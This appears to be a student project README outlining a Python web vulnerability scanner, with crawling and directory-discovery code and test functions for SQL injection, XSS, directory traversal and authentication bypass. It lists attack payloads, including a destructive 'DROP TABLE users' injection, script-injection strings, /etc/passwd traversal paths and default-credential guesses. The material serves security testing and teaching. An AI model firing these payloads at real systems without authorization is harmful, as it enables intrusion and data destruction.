# advenced-programming-project
 What Exactly Does This Tool Do?
A web application scanner automates the process of finding security vulnerabilities in websites and web applications. It's like a robotic penetration tester that systematically probes for weaknesses.

Core Functionality:
Discovers all accessible parts of a website (pages, forms, APIs)
Tests each component for known vulnerability patterns
Analyzes responses to detect potential security issues
Generates a comprehensive security report
1. Web Crawling & Discovery:
Concept: Mapping the entire attack surface of a web application

What it involves:

Spidering through all links on a website
Discovering hidden directories and files
Finding forms, input fields, and API endpoints
Identifying technologies used (PHP, ASP.NET, JavaScript frameworks)

How it works:

python
def discover_content(base_url):
    # Finds pages like: /admin/, /config/, /backup.zip
    common_paths = ['admin', 'login', 'config', 'backup', 'phpinfo.php']
    discovered = []
    
    for path in common_paths:
        test_url = f"{base_url}/{path}"
        response = requests.get(test_url)
        if response.status_code == 200:  # Page exists
            discovered.append(test_url)
    
    return discovered


ways to extract the urls in the app:

As you process each URL, you extract more URLs from the page content:
def extract_urls_from_page(current_url, html_content):
    """Find ALL URLs in a web page"""
    urls_found = []
    soup = BeautifulSoup(html_content, 'html.parser')
    
    # 1. Find all <a> tags with href attributes
    for link in soup.find_all('a', href=True):
        href = link['href']
        full_url = urljoin(current_url, href)  # Convert to absolute URL
        urls_found.append(full_url)
    
    # 2. Find URLs in <img> tags
    for img in soup.find_all('img', src=True):
        src = img['src']
        full_url = urljoin(current_url, src)
        urls_found.append(full_url)
    
    # 3. Find URLs in <script> tags
    for script in soup.find_all('script', src=True):
        src = script['src']
        full_url = urljoin(current_url, src)
        urls_found.append(full_url)
    
    # 4. Find URLs in <link> tags (CSS, etc.)
    for link in soup.find_all('link', href=True):
        href = link['href']
        full_url = urljoin(current_url, href)
        urls_found.append(full_url)
    
    # 5. Find URLs in form actions
    for form in soup.find_all('form', action=True):
        action = form['action']
        full_url = urljoin(current_url, action)
        urls_found.append(full_url)
    
    return urls_found

What You're Looking For:
All pages (visible and hidden)
All forms (login, search, contact, upload)
All parameters (URL parameters, form fields)
All endpoints (API endpoints, file paths)
Technology hints (frameworks, server info)

Libraries:
requests - HTTP requests
beautifulsoup4 - HTML parsing
urllib3 / urllib.parse - URL handling
re - Regular expressions for pattern matching
collections - For queues and data structures


other ways to get the names of the hidden directories/files: 

B. Sitemap.xml Analysis
def parse_sitemap(base_url):
    """Extract all URLs from sitemap.xml"""
    sitemap_url = f"{base_url}/sitemap.xml"
    response = requests.get(sitemap_url)
    
    if response.status_code == 200:
        urls = re.findall(r'<loc>(.*?)</loc>', response.text)
        return urls
    return []


or:
C. Source Code Analysis:
Examining the the html , java script and any client side code of web pages to find hidden URLs and api endpoints
    
or:
D. Google Dorking Style Discovery:
Using special search operators to find hidden files and directories or exposed configuration files…. ect


          
4. Machine Learning Approach (research still ongoing):

or:
using wordlists : 
popular wordlists:

Instead of hardcoding paths, use established wordlists:

DirBuster's wordlist (very comprehensive)
SecLists on GitHub (huge collection)
Common directories from known tools

Where to Get Good Wordlists:

# can download and use locally and  use these established wordlists
COMMON_WORDLIST_SOURCES = [
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt",
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/directory-list-2.3-medium.txt",
    
]

def download_wordlist(url, local_path):
    response = requests.get(url)
    with open(local_path, 'w') as f:
        f.write(response.text)



2. SQL Injection Testing: 
Concept: One of the most critical web vulnerabilities where attackers can manipulate database queries through user input.


What it tests:
Login forms, search boxes, contact forms
URL parameters (?id=1)
HTTP headers

How it works:

python
def test_sql_injection(url, parameter, value):
    # Payloads that might cause database errors or unusual behavior
    payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users--",
        "1' ORDER BY 1--",
        "1' UNION SELECT 1,2,3--"
    ]
    
    for payload in payloads:
        test_data = {parameter: payload}
        response = requests.get(url, params=test_data)
        
        # Check for SQL error patterns
        error_indicators = [
            "mysql_fetch_array", "ORA-", "SQL syntax", 
            "Microsoft OLE DB Provider"
        ]
        
        for error in error_indicators:
            if error in response.text:
                return f"SQL Injection vulnerability found with: {payload}"

SQL injection payload generation strategies:
sql pattern based generation of payload:



def generate_sql_payloads(parameter_value):
    """Generate context-aware SQL injection payloads"""
    payloads = []
    
    # Base patterns that work across SQL databases
    base_patterns = [
        # Basic injection
        "{}'",
        "{}'--",
        "{}'#",
        "{}')--",
        "{}'))--",
        
        # Union-based
        "{}' UNION SELECT {columns}--",
        "{}') UNION SELECT {columns}--",
        "{}')) UNION SELECT {columns}--",
        
        # Boolean-based blind
        "{}' AND '1'='1",
        "{}' AND '1'='2",
        "{}' OR '1'='1",
        
        # Time-based blind
        "{}' AND SLEEP(5)--",
        "{}' AND BENCHMARK(1000000,MD5('test'))--",
        
        # Stacked queries
        "{}'; DROP TABLE users--",
        "{}'; SELECT * FROM information_schema.tables--",
    ]
        
   context aware payload generation: 
	generating the payloads to test according to the input field context (whether it was a numeric field or string field or a login field or a search field….)


3. Cross-Site Scripting (XSS) Testing
Concept: Attackers inject malicious scripts that execute in victims' browsers.

What it tests:

Any user input that gets reflected back to the page

Search results, comment sections, form submissions

How it works:

python
def test_xss(url, parameter, value):
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>"
    ]
    
    for payload in xss_payloads:
        test_data = {parameter: payload}
        response = requests.post(url, data=test_data)
        
        # Check if payload is reflected without sanitization
        if payload in response.text:
            return f"XSS vulnerability found with: {payload}"

XSS payload testing strategies:
Context Awareness - Different HTML contexts need different payloads
Polyglot Payloads - Work in multiple contexts simultaneously
Progressive Testing - Start simple, escalate based on results
Encoding Variations - Bypass basic filters
DOM-based Detection - Requires browser simulation
Event Handler Coverage - Test all possible event handlers
4. Directory Traversal Testing:
Concept: Accessing files outside the web root directory.

What it tests:

File download functionality
Image loading endpoints
Any parameter that takes file paths

How it works:

python
def test_directory_traversal(url, parameter):
    traversal_payloads = [
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "../../config.php"
    ]
    
    for payload in traversal_payloads:
        test_data = {parameter: payload}
        response = requests.get(url, params=test_data)
        
        # Check for sensitive file content
        if "root:" in response.text or "<?php" in response.text:
            return f"Directory traversal vulnerability found"
5. Authentication Bypass Testing
Concept: Trying to access protected areas without proper credentials.

What it tests:

Admin panel
User account page
API endpoints requiring authentication

How it works:

python

def test_auth_bypass(protected_url):
    # Common bypass techniques
    bypass_attempts = [
        {"admin": "true"},  # Cookie manipulation
        {"X-Forwarded-For": "127.0.0.1"},  # IP spoofing
        # Try common default credentials
        {"username": "admin", "password": "admin"},
        {"username": "admin", "password": "password123"}
    ]
    
    for attempt in bypass_attempts:
        response = requests.get(protected_url, headers=attempt)
        if response.status_code == 200 and "Dashboard" in response.text:
            return "Authentication bypass possible"


libraries needed for this functionality: 

requests - For making HTTP requests
beautifulsoup4 - For parsing HTML responses
urllib3 - For URL handling
base64 - For cookie decoding/encoding
json - For handling JSON data
hashlib - For hash calculations (if testing signed tokens)

Tools:

For Analysis:
Browser Developer Tools - Inspect cookies and requests
Burp Suite Community - Analyze traffic patterns
OWASP ZAP - Automated testing baseline
For Development:
Jupyter Notebook - For testing ideas interactively
Postman/Insomnia - For manual request testing
Python Debugger - For troubleshooting your code

🏗️ How the Scanner Works: Step-by-Step:
Phase 1: Reconnaissance
text
Input: https://example.com
↓
Discover all links and endpoints
↓
Identify forms and input parameters
↓
Map the application structure

Phase 2: Vulnerability Assessment
text
For each discovered endpoint:
↓
Test for SQL Injection
↓
Test for XSS  
↓
Test for Directory Traversal
↓
Test for Authentication Issues
↓
Record findings
Phase 3: Analysis & Reporting
text
Analyze all test results
↓
Filter false positives
↓
Categorize by severity
↓
Generate detailed report





